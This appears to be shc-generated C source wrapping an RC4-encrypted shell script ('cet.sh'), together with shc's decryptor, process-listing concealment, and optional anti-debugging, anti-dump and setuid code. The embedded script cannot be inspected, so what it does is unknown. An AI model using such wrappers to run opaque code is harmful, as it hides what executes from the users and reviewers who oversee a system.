#if 0
	shc Version 4.0.1, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f cet.sh -o cet 
#endif

static  char data [] = 
#define      msg2_z	19
#define      msg2	((&data[2]))
	"\160\217\113\340\270\032\255\074\152\265\176\332\316\131\157\051"
	"\205\153\151\303\253\245\046\020\034"
#define      text_z	1300
#define      text	((&data[37]))
	"\324\175\223\304\267\102\025\006\300\204\164\163\135\223\100\005"
	"\350\017\226\020\117\273\027\157\321\037\216\237\366\226\242\344"
	"\066\055\041\104\004\126\247\046\223\137\055\327\031\037\056\330"
	"\372\054\305\151\034\105\023\372\371\105\223\167\340\025\027\026"
	"\077\342\363\136\134\343\366\204\077\231\137\371\073\054\352\361"
	"\066\002\005\253\021\244\035\043\230\334\076\054\053\015\323\074"
	"\307\376\115\022\111\055\247\012\322\040\061\124\012\235\145\317"
	"\332\302\004\234\203\171\316\342\076\305\006\115\137\057\166\163"
	"\100\040\207\137\367\361\007\363\266\042\275\211\224\104\036\154"
	"\131\231\162\312\367\061\205\350\370\072\120\261\026\274\114\037"
	"\151\104\255\317\311\261\237\223\324\377\103\113\075\316\302\232"
	"\176\163\333\157\342\235\175\073\165\077\131\212\003\201\173\275"
	"\125\134\337\151\041\204\061\272\341\136\116\075\043\155\112\006"
	"\055\216\260\242\377\247\026\013\266\101\330\374\307\031\232\136"
	"\321\245\322\151\004\156\230\060\052\330\241\007\036\164\153\130"
	"\265\042\012\142\150\150\166\112\150\113\040\360\330\145\045\145"
	"\073\177\115\031\263\163\237\370\170\126\366\024\035\376\230\211"
	"\247\022\237\170\314\026\136\177\227\117\037\302\371\151\365\037"
	"\164\375\377\224\124\017\133\320\341\043\046\347\020\311\150\131"
	"\220\271\207\045\314\311\167\060\104\360\200\020\137\335\061\062"
	"\214\233\375\221\103\234\104\146\122\031\062\171\043\131\207\123"
	"\304\201\075\305\034\065\211\166\234\255\137\145\034\153\350\051"
	"\060\015\275\046\125\171\273\133\165\242\155\203\265\174\130\007"
	"\000\164\324\303\370\110\010\073\066\362\020\275\303\207\041\020"
	"\037\037\353\366\215\114\025\130\200\220\373\244\370\270\333\146"
	"\252\246\340\273\113\221\373\177\053\365\174\022\261\373\177\315"
	"\164\065\262\211\115\222\143\337\046\341\123\242\165\132\242\147"
	"\155\064\267\342\107\041\243\035\233\137\171\177\201\300\102\121"
	"\162\242\334\341\326\004\036\123\354\161\234\032\021\233\025\113"
	"\271\042\104\257\164\211\206\271\201\172\272\067\300\351\001\067"
	"\277\345\256\373\345\245\133\333\313\242\160\246\103\212\356\347"
	"\251\023\152\162\052\367\141\244\111\000\272\346\320\015\130\146"
	"\241\225\157\021\070\121\024\236\360\214\157\317\277\143\261\307"
	"\373\277\226\002\246\346\260\364\115\262\145\321\206\156\310\372"
	"\363\225\343\065\253\024\012\115\202\230\060\356\354\322\122\245"
	"\024\147\071\020\160\237\370\211\276\167\051\125\203\342\131\036"
	"\235\221\172\320\337\362\330\320\125\060\100\067\021\031\263\067"
	"\343\014\104\004\061\377\277\340\000\333\227\216\062\263\320\160"
	"\321\102\030\200\104\310\056\005\123\165\205\263\046\211\032\117"
	"\101\302\310\235\151\231\225\066\171\047\032\312\035\314\243\037"
	"\376\045\136\175\107\160\101\246\102\355\121\106\052\301\365\004"
	"\176\315\241\327\372\351\267\116\251\324\215\340\106\247\274\320"
	"\220\337\343\310\147\120\301\172\226\153\247\201\302\201\167\020"
	"\113\120\346\332\141\005\275\011\026\302\245\252\342\217\215\033"
	"\361\355\212\354\004\036\260\367\363\051\157\157\172\211\040\351"
	"\253\131\052\302\063\025\246\061\023\356\206\350\366\016\131\144"
	"\163\220\113\150\377\320\230\155\235\134\353\276\020\224\166\316"
	"\234\150\346\365\321\036\021\133\017\342\215\133\370\045\136\020"
	"\014\263\321\310\104\327\031\211\051\031\024\071\207\245\142\317"
	"\124\337\125\056\164\226\107\213\253\303\223\061\133\315\364\214"
	"\270\204\156\160\266\123\351\261\306\312\015\337\220\053\331\310"
	"\061\116\364\367\215\100\021\124\135\142\327\222\323\260\210\243"
	"\227\317\253\253\336\344\130\354\352\115\373\247\315\236\120\304"
	"\001\323\163\024\332\344\306\355\151\027\052\262\173\066\306\357"
	"\146\036\066\201\247\363\346\046\140\225\357\065\114\057\104\130"
	"\206\321\371\347\025\265\054\103\136\016\157\065\006\015\366\220"
	"\100\004\344\254\244\222\312\206\210\176\344\121\073\273\227\024"
	"\174\101\141\204\345\221\243\150\225\326\075\326\305\152\020\044"
	"\212\046\325\323\177\173\315\070\167\331\264\151\361\057\034\340"
	"\322\060\276\310\353\334\210\217\156\154\203\252\054\026\164\251"
	"\063\145\164\263\040\327\240\161\303\300\206\037\136\071\031\174"
	"\067\322\272\342\235\356\346\344\130\233\220\300\005\261\033\326"
	"\215\351\111\130\214\276\051\026\161\006\127\072\307\303\305\173"
	"\210\053\352\071\041\361\340\337\031\353\365\116\200\371\365\250"
	"\371\337\350\126\222\063\011\012\120\203\111\355\044\257\030\235"
	"\160\200\042\215\325\274\237\256\271\140\334\027\212\103\210\001"
	"\207\243\174\216\252\240\172\223\320\150\256\304\230\041\362\312"
	"\300\021\227\265\152\322\256\047\236\355\236\024\031\154\131\277"
	"\120\254\244\251\063\364\047\052\005\050\027\256\045\160\120\261"
	"\013\114\152\341\064\044\034\057\225\206\102\305\004\176\322\100"
	"\165\343\045\130\052\176\260\257\150\213\370\220\266\310\263\343"
	"\172\101\031\022\244\030\277\227\120\152\114\364\055\324\034\321"
	"\102\060\340\273\122\156\337\304\306\031\133\260\216\114\100\225"
	"\366\070\271\002\365\073\155\205\203\211\105\172\214\313\061\170"
	"\302\200\340\155\266\101\303\057\260\031\351\141\334\240\044\056"
	"\347\022\061\154\052\355\244\045\037\156\067\210\137\376\163\035"
	"\333\140\323\163\142\052\045\167\136\025\155\362\221\065\327\205"
	"\072\013\157\375\171\201\162\012\135\160\122\214\117\335\007\347"
	"\174\007\134\073\205\251\037\267\003\065\176\136\135\173\065\317"
	"\302\204\253\356\067\113\263\234\052\355\072\310\262\314\332\157"
	"\103\175\144\242\206\226\271\062\077\006\237\372\354\012\337\341"
	"\015\257\153\201\230\136\251\165\106\076\054\205\011\354\142\071"
	"\262\245\203\167\315\006\233\306\066\146\250\215\211\101\226\104"
	"\311\135\051\206\063\074\042\335\274\013\365\014\073\124\214\166"
	"\034\350\237\272\077\266\304\307\162\163\124\302\054\074\150\320"
	"\126\165\054\251\173\246\022\131\327\054\272\206\022\106\074\304"
	"\171\104\071\027\245\120\214\303\106\262\022\321"
#define      msg1_z	65
#define      msg1	((&data[1420]))
	"\230\137\031\315\252\027\307\077\361\156\140\100\026\075\113\107"
	"\343\076\262\360\157\343\050\066\000\051\247\255\311\317\072\223"
	"\166\356\235\331\005\053\231\366\024\255\355\322\043\373\130\367"
	"\001\312\025\016\373\001\300\332\332\135\360\112\062\034\213\021"
	"\022\330\151\204\201\142\256\373\163\210\116\256\172\172\347\026"
	"\246\112\243\146\333\367\340"
#define      pswd_z	256
#define      pswd	((&data[1558]))
	"\301\355\250\257\233\124\055\363\261\155\016\103\166\171\025\322"
	"\350\210\374\377\006\226\014\163\133\331\263\336\132\015\165\370"
	"\060\340\355\322\245\233\366\002\133\224\042\104\342\110\245\354"
	"\334\066\162\271\043\105\375\030\111\272\051\330\071\063\115\317"
	"\364\120\066\306\223\127\037\046\246\124\062\262\005\075\370\170"
	"\073\361\261\357\255\163\104\276\274\211\002\325\077\327\257\056"
	"\317\122\276\261\007\075\300\115\254\135\372\230\030\237\344\122"
	"\314\267\032\147\045\074\332\143\257\112\120\350\067\012\305\213"
	"\023\265\331\355\003\216\373\025\257\256\252\123\175\223\153\346"
	"\250\270\152\317\134\377\263\044\104\046\127\330\153\352\225\140"
	"\162\114\154\251\133\015\226\037\374\170\140\072\337\007\155\346"
	"\017\376\176\302\337\327\065\223\234\132\367\161\070\206\072\331"
	"\144\056\122\274\247\140\217\056\273\106\116\372\131\043\167\240"
	"\051\233\022\155\052\232\234\313\016\117\117\116\224\164\010\211"
	"\023\377\341\372\000\344\116\145\005\160\350\112\332\174\057\222"
	"\367\323\376\240\203\212\130\313\111\017\041\325\025\175\230\323"
	"\055\120\211\141\075\366\357\153\042\060\317\170\070\250\055\145"
	"\215\062\241\366\046\147\044\056\021\301\020\124\273\165\334\221"
	"\032\040\032\221\357\341\211\320\137\274\335\221\044\153\377\216"
	"\071\365\312\147\031\115\077\066\031\004\220\244\252\364\315\273"
	"\062\054\364\252\250\357\335\102"
#define      tst1_z	22
#define      tst1	((&data[1832]))
	"\356\071\263\061\110\330\040\376\303\244\337\033\204\371\334\132"
	"\110\311\233\224\070\235\112\217\140\161\107\101\262\061\330"
#define      opts_z	1
#define      opts	((&data[1859]))
	"\273"
#define      inlo_z	3
#define      inlo	((&data[1860]))
	"\313\207\066"
#define      tst2_z	19
#define      tst2	((&data[1864]))
	"\127\155\273\122\162\356\341\306\126\055\367\307\031\361\132\324"
	"\104\375\156\040\151"
#define      chk2_z	19
#define      chk2	((&data[1887]))
	"\076\053\263\114\011\367\115\304\076\157\356\127\037\026\022\275"
	"\322\325\217\361\333\213\213\246\366\151"
#define      xecc_z	15
#define      xecc	((&data[1911]))
	"\050\202\025\242\116\274\157\047\010\156\021\026\364\177\042\333"
	"\074\360\015"
#define      date_z	1
#define      date	((&data[1929]))
	"\066"
#define      chk1_z	22
#define      chk1	((&data[1931]))
	"\026\143\367\221\307\076\112\335\174\066\314\004\235\320\054\217"
	"\260\222\224\315\122\154\111\330\102"
#define      shll_z	10
#define      shll	((&data[1955]))
	"\245\254\204\324\103\175\233\003\341\140"
#define      lsto_z	1
#define      lsto	((&data[1965]))
	"\330"
#define      rlax_z	1
#define      rlax	((&data[1966]))
	"\063"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define HARDENINGSP	0	/* Define as 1 to disable bash child process */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a processs */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;

    int lentmp = len;

#if HARDENINGSP
    //Start tracing to protect from dump & trace
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }

    //Decode Bash
    while (len > 0) {
        indx++;
        tmp = stte[indx];
        jndx += tmp;
        stte[indx] = stte[jndx];
        stte[jndx] = tmp;
        tmp += stte[indx];
        *ptr ^= stte[tmp];
        ptr++;
        len--;
    }

    //Exec bash script
    system(tmp2);

    //Empty script variable
    memcpy(tmp2, str, lentmp);

    //Sinal to detach ptrace
    ptrace(PTRACE_DETACH, 0, 0, 0);
    exit(0);

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
#endif /* HARDENINGSP Exit here anyway*/

    int pid, status;
    pid = fork();

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            printf("Operation not permitted\n");
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Exec bash script
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {
        wait(&status);
    }

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
} 
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
